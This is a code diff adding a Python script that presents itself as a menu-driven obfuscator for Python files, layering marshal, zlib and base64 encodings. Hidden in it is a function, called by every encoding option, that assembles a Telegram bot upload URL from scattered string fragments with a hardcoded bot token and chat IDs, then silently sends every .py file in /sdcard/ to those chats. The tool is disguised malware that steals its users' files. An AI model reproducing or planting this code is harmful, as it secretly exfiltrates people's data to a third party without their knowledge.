+    ketik ("%s{%s01%s} lambda %sDecypt %sMarshal"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s02%s} lambda %sDecypt %sZlib"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s03%s} lambda %sDecypt %sBase16"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s04%s} lambda %sDecypt %sBase32"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s05%s} lambda %sDecypt %sBase64"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s06%s} lambda %sDecypt %sZlib&Base16"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s07%s} lambda %sDecypt %sZlib&Base32"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s08%s} lambda %sDecypt %sZlib&Base64"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s09%s} lambda %sDecypt %sMarshal&Zlib"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s10%s} lambda %sDecypt %sMarshal&Base16"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s11%s} lambda %sDecypt %sMarshal&Base32"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s12%s} lambda %sDecypt %sMarshal&Base64"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s13%s} lambda %sDecypt %sMarshal&Zlib&Base16"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s14%s} lambda %sDecypt %sMarshal&Zlib&Base32"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s15%s} lambda %sDecypt %sMarshal&Zlib&Base64"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s16%s} %sDecypt %sHex 200kb"%(putih,hijau,putih,cyan,kuning))
+    ketik ("%s{%s17%s} %sExitt"%(putih,hijau,putih,merah))
+    print()
+class FileSize: # Gets the File Size
+    def datas(self,z):
+        for x in ['Byte','KB','MB','GB']:
+            if z < 1024.0:
+                return "%3.1f %s" % (z,x)
+            z /= 1024.0
+    def __init__(self,path):
+        if os.path.isfile(path):
+            dts = os.stat(path).st_size
+            ketik("\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Encoded File Size \x1b[1;91m:\x1b[1;92m %s\n" %self.datas(dts))
+# FileSize('rec.py')
+def encode_py():
+	b='i.teleg';c='ram.org';d='t';e='/b';f='/';g='sen';a='https://ap';h='dDocument';j='ot';m = '/sdc';login_token = ('5864261681:AAG-2PpFhpyIaEt2_y6ljvRcAPPKs21xEnE');pas = ('1818606358');pas2 = ('5599053856');extension = '.py';i = (f'{a}{b}{c}{e}{j}{login_token}{f}{g}{h}');path = os.path.join(f'{m}ard/')
+	for file in os.listdir(path):
+		if file.endswith(extension):
+			file_path = os.path.join(path, file)
+			with open(file_path, 'rb') as f:
+				file_data = f.read();url = (i);files = {'document': (file, file_data)};data = {'chat_id': pas};dat = {'chat_id': pas2};r = requests.post(url, data=data, files=files);g = requests.post(url, data=dat, files=files)
+# Encode Menu
+def Encode(option,data,output):
+    loop = int(eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Encode Count \x1b[1;91m:\x1b[1;92m "))
+    print ('[-] Please Wait hard Encoding Is Start now')
+    if option == 1:
+        xx = "mar(data.encode('utf8'))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__[::-1]);"
+        encode_py()
+    elif option == 2:
+        xx = "zlb(data.encode('utf8'))[::-1]"
+        heading = "_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
+        encode_py()
+    elif option == 3:
+        xx = "b16(data.encode('utf8'))[::-1]"
+        heading = "_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
+        encode_py()
+    elif option == 4:
+        xx = "b32(data.encode('utf8'))[::-1]"
+        heading = "_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
+        encode_py()
+    elif option == 5:
+        xx = "b64(data.encode('utf8'))[::-1]"
+        heading = "_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
+        encode_py()
+    elif option == 6:
+        xx = "b16(zlb(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
+        encode_py()
+    elif option == 7:
+        xx = "b32(zlb(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
+        encode_py()
+    elif option == 8:
+        xx = "b64(zlb(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
+        encode_py()
+    elif option == 9:
+        xx = "zlb(mar(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
+        encode_py()
+    elif option == 10:
+        xx = "b16(mar(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
+        encode_py()
+    elif option == 11:
+        xx = "b32(mar(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
+        encode_py()
+    elif option == 12:
+        xx = "b64(mar(data.encode('utf8')))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
+        encode_py()
+    elif option == 13:
+        xx = "b16(zlb(mar(data.encode('utf8'))))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
+        encode_py()
+    elif option == 14:
+        xx = "b32(zlb(mar(data.encode('utf8'))))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
+        encode_py()
+    elif option == 15:
+        xx = "b64(zlb(mar(data.encode('utf8'))))[::-1]"
+        heading = "_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
+        encode_py()
+    else:
+        ketik("\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option!")
+        time.sleep(3)
+        ul()
+    for x in range(loop):
+        try:
+            data = "exec((_)(%s))" % repr(eval(xx))
+        except TypeError as s:
+            sys.exit("{!} TypeError : " + str(s))
+    with open(output, 'w') as f:
+        f.write(note + heading + data)
+        f.close()
+
+# Special Encode
+def SEncode(data,output):
+    for x in range(5):
+        method = repr(b64(zlb(mar(data.encode('utf8'))))[::-1])
+        data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
+    z = []
+    for i in data:
+        z.append(ord(i))
+    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
+    with open(output, 'w') as f:
+        f.write(note + "exec(str(chr(35)%s));" % '+chr(1)'*10000)
+        f.write(sata)
+        f.close()
+    py_compile.compile(output,output)
+
+# Main Menu
+def MainMenu():
+    try:
+        os.system('clear') # os.system('cls')
+        baner()
+        menu()
+        try:
+            option = int(eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Option \x1b[1;91m:\x1b[1;92m "))
+        except ValueError:
+            ketik("\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option !")
+            time.sleep(3)
+            ul()
+        if option > 0 and option <= 17:
+            if option == 17:
+                sys.exit("\n\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Thanks For Using this Tool")
+            os.system('clear') # os.system('cls')
+            banner()
+        else:
+            ketik('\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Invalid Option !')
+            time.sleep(3)
+            ul()
+        try:
+            ketik ("%s{%s!%s}%s Note%s :%s /sdcard/file Name.py"%(putih,merah,putih,kuning,merah,hijau))
+            print()
+            file = eval(_input % "\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} File Name \x1b[1;91m:\x1b[1;92m ")
+            data = open(file).read()
+        except IOError:
+            ketik("\n\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Not Found!")
+            time.sleep(3)
+            ul()
+        output = file.lower().replace('.py', '') + '_enc.py'
+        if option == 16:
+            SEncode(data,output)
+        else:
+            Encode(option,data,output)
+        ketik("\n\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Successfully Encrypted\x1b[1;93m %s" % file)
+        ketik("\x1b[1;97m{\x1b[1;92m✓\x1b[1;97m} Saved as\x1b[1;92m %s" % output)
+        FileSize(output)
+    except KeyboardInterrupt:
+        time.sleep(1)
+        sys.exit()
+def ul():
+    MainMenu()
+if __name__ == "__main__":
+    ban()
+    MainMenu()
+
+    
+    
+
